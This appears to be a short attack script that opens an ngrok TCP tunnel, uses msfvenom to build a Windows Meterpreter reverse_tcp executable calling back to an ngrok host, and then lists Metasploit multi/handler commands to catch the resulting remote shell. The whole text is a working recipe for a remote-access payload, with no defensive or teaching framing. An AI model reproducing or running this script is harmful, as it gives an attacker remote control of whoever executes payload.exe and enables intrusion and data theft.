echo "Setting up ngrok";
./ngrok tcp 9999
echo "Done";
echo "Building shell";
msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=19631 -f exe > payload.exe
echo "Done";
echo "Setting up listener"
echo "Done"
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 9999
exploit
